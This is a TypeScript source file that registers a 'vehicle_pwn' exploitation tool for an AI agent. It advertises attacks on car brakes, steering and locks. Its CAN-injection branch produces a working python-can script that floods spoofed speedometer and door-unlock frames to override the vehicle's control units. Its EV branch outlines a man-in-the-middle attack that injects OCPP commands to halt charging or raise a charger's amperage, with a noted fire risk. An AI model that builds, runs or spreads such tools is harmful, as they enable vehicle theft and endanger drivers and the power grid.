export * as VehiclePwnTool from "./vehicle-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "vehicle_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'can_inject' (Inject malicious CAN bus frames), 'telematics_hijack' (Exploit cellular head-unit connections), 'keyfob_clone' (Rolljam/SDR attack on keyless entry), 'ev_grid_pwn' (OCPP manipulation for charging stations).",
  }),
  target_bus: Schema.String.pipe(Schema.optional).annotate({
    description: "Target CAN interface (e.g., 'vcan0', 'can1').",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  can_script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Vehicle and Automotive Exploitation Engine. Capabilities: CAN (Controller Area Network) bus injection, Telematics API hijacking, Keyless Entry cloning (Rolljam), and EV Charging grid exploitation (OCPP). Can manipulate physical vehicle components (brakes, steering, locks) if connected to the OBD-II port or internal network.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "can_inject") {
                outputText = `# CAN Bus Frame Injection\n\nTarget Interface: ${input.target_bus || "can0"}\nImpact: Flooding or spoofing CAN messages to bypass the Engine Control Unit (ECU) and manipulate physical components (e.g., spoofing speedometer, disabling brakes, unlocking doors).`
                script = `#!/usr/bin/env python3
# Automotive CAN Bus Injection using python-can
import can
import time

BUS = "${input.target_bus || "can0"}"

# Setup CAN interface
bus = can.interface.Bus(channel=BUS, bustype='socketcan')

print(f"[*] Connected to {BUS}. Beginning malicious frame injection...")

# Example: Spoofing the speedometer to read 150 MPH
# ArbID (Arbitration ID) varies by manufacturer. 0x0B4 is often Speed/RPM on some models.
msg_speed = can.Message(arbitration_id=0x0B4,
                        data=[0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00],
                        is_extended_id=False)

# Example: Unlocking doors (ArbID 0x19B for some vehicles)
msg_unlock = can.Message(arbitration_id=0x19B,
                         data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02],
                         is_extended_id=False)

try:
    while True:
        bus.send(msg_speed)
        bus.send(msg_unlock)
        print("[+] Frames injected successfully.")
        time.sleep(0.01) # High frequency flood to overpower legitimate ECU signals
except KeyboardInterrupt:
    print("[*] Injection stopped.")
`
              } else if (action === "ev_grid_pwn") {
                outputText = `# EV Charging Station Exploitation (OCPP)`
                script = `# Open Charge Point Protocol (OCPP) Manipulation
# Intercepting WebSocket traffic between EV Charger and Central System

# 1. Man-in-the-Middle the charger's internet connection
# 2. Inject an OCPP "RemoteStopTransaction" to halt charging for targeted users
# 3. Inject an OCPP "ChangeConfiguration" payload to alter the charger's max amperage, potentially causing a grid surge or fire hazard.
`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, can_script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Vehicle Pwn failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/vehicle-pwn",
  layer,
  deps: [ToolRegistry.node],
})
